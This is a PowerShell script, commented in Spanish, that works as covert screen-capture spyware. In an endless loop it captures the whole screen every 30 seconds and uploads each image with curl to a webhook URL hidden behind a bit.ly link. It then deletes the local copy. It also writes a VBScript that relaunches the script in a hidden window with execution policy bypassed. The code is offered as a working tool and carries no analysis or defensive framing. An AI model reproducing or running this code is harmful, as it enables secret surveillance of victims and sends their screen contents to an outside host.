$hookurl = "https://bit.ly/chu_kbras"
$seconds = 30 # Intervalo entre capturas
$maxImages = 1 # Cantidad máxima de imágenes antes de descargar el otro script

# Detección de URL acortada
if ($hookurl.Length -ne 121) {
    Write-Host "Shortened Webhook URL Detected!!..."
    $hookurl = (irm $hookurl).url
}

# Obtener la ruta del directorio donde se encuentra este script
$scriptDirectory = $PSScriptRoot
if (-not $scriptDirectory) {
    $scriptDirectory = Split-Path -Parent $MyInvocation.MyCommand.Definition
}

# Verificar si la ruta del directorio está definida
if (-not $scriptDirectory) {
    Write-Host "No se puede determinar la ruta del directorio del script."
    exit
}

# Obtener la ruta del archivo de VBScript
$vbsScriptPath = Join-Path -Path $scriptDirectory -ChildPath "RunHidden.vbs"

# Crear el archivo VBScript si no existe
if (-not (Test-Path $vbsScriptPath)) {
@"
Set WshShell = CreateObject(""WScript.Shell"")
WshShell.Run ""powershell.exe -ExecutionPolicy Bypass -File '$($MyInvocation.MyCommand.ScriptFullName)' "", 0, false
"@ | Set-Content -Path $vbsScriptPath -Encoding ASCII
}

do {
    $Filett = Join-Path -Path $env:temp -ChildPath "SC.png"
    # Verificar si el archivo ya existe antes de crear uno nuevo
    if (-not (Test-Path $Filett)) {
        Add-Type -AssemblyName System.Windows.Forms
        Add-type -AssemblyName System.Drawing
        $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
        $Width = $Screen.Width
        $Height = $Screen.Height
        $Left = $Screen.Left
        $Top = $Screen.Top
        $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
        $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
        $bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
    }
    Start-Sleep 1
    curl.exe -F "file1=@$Filett" "$hookurl"
    Start-Sleep 1
    Remove-Item -Path $Filett
    Start-Sleep $seconds

    # Verificar si se ha alcanzado la cantidad máxima de imágenes
    if ($a -eq $maxImages) {
        # Ejecutar el archivo de VBScript
        Start-Process wscript.exe -ArgumentList $vbsScriptPath

        # Reiniciar contador de imágenes
        $a = 0
    }
} while ($true)